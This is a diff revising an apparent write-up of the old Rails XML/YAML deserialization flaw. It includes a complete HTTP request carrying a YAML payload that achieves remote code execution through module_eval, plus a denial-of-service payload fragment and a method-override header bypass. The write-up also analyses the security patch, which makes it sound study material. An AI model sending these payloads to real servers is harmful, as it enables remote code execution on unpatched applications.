@@ -315,22 +315,21 @@ deliver the payload, which we assume resides in a file called `payload_time`:
 
 Upon inspection of the application console, we see the following printed:
 
+    Parameters: {"bang"=>2013-05-17 16:58:43 +0200}
 
+We have thus verified that the described vulnerability exists.
 
-
-As it turns out, the rails router does not process `POST` requests by default.
-We can however get around this using a special `HTTP` header:
+As it turns out, older versions of Rails may not process `POST` requests by
+default.  We can however get around this using a special `HTTP` header:
 
     X-HTTP-Method-Override: GET
 
-This header makes the router treat the `POST` request as if it were a `GET` request.
-
-Upon sending the payload with the modified header, we get the following output in the console:
-
-
-
+This header makes the router treat the `POST` request as if it were a `GET`
+request.
     
-We have thus verified that the described vulnerability exists.
+For our specific version of Rails, this is not necessary. It does however allow
+the exploit to work on almost any version of Rails older than the most recently
+vulnerable.
 
 #### Exploiting the vulnerability
 
@@ -353,7 +352,8 @@ Examples of this and many other attacks are provided by blogger under the alias
 *ronin*[2].  Here is a simple example of a payload for a `DoS` attack:
 
     <?xml version="1.0" encoding="UTF-8"?>
-    <exploit type="yaml">---:foo1: true
+    <exploit type="yaml">---
+      :foo1: true
       :foo2: true
       :foo3: true
       <!-- ... -->
@@ -373,9 +373,9 @@ such a class:
     <?xml version="1.0" encoding="UTF-8"?>
     <exploit type="yaml">
     --- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
-    ? ! 'foo; puts "Hello world!"
+    ? |
+      foo; (puts 'Fire the missiles!'; @executed = true) unless @executed
       __END__
-    '
     : !ruby/struct
       defaults:
         :action: create
@@ -407,17 +407,19 @@ Result
 
 Our final exploit payload looks like this in its entirety:
 
-    POST /index.html HTTP/1.1
-    Host: localhost
+    POST / HTTP/1.1
     Content-Type: text/xml
-    X-HTTP-Method-Override: GET
-
+    X-Http-Method-Override: get
+    Accept: */*
+    Host: localhost:3000
+    Content-Length: 406
+    
     <?xml version="1.0" encoding="UTF-8"?>
     <exploit type="yaml">
     --- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
-    ? ! 'foo; puts "Hello world!"
+    ? |
+      foo; (puts 'Fire the missiles!'; @executed = true) unless @executed
       __END__
-    '
     : !ruby/struct
       defaults:
         :action: create
@@ -465,7 +467,7 @@ a serialized instance of the Rails class `NamedRouteCollection`.
 The next part is where the fun begins. Our serialized NamedRouteCollection has
 one key value mapping with the key:
 
-    'foo; puts "Hello world!"
+    foo; (puts 'Fire the missiles!'; @executed = true) unless @executed
       __END__
     '
 {: .language-yaml}
@@ -601,14 +603,20 @@ With our malicious code still in the `name` variable, the call to `module_eval`
 will look something like this with the string interpolations evaluated:
 
     @module.module_eval <<-END_EVAL, __FILE__, __LINE__ + 1
-      remove_possible_method :hash_for_foo; puts "Hello World!"
+      remove_possible_method :hash_for_foo; puts "Fire the missiles!" unless @executed; @executed = true
     __END__
 
-The result being `foo` printed to the standard out of the running server. The
-`puts "hello"` part could however have been much more malicious, had we wanted
-it to.
+The result being `Fire the missiles!` printed to the standard out of the
+running server. The `puts "Fire the missiles!"` part could however have been
+much more malicious, had we wanted it to.
 
-We have thus successfully achieved remote code execution.
+On a side note, we add the `@executed = true` definition to the exploit since
+further down in the code, the malicious code is actually evaluated another time
+in the same manner as described above. The definition of an instance variable
+on the `NamedRouteCollection` makes sure that the code only gets executed once,
+even though it is evaluated several times.
+
+In conclusion, we have successfully achieved remote code execution.
 
 #### Analysis of security patches
 
@@ -640,6 +648,7 @@ present.  This helps us understand the following diff:
     + def from_xml(xml, disallowed_types = nil)
     + typecast_xml_value(unrename_keys(ActiveSupport::XmlMini.parse(xml)), disallowed_types)
     + end
+{: .language-diff}
 
 We see that the security path essentially just forbids the presence of the
 `type="yaml"` attribute, by throwing an error if it is present.
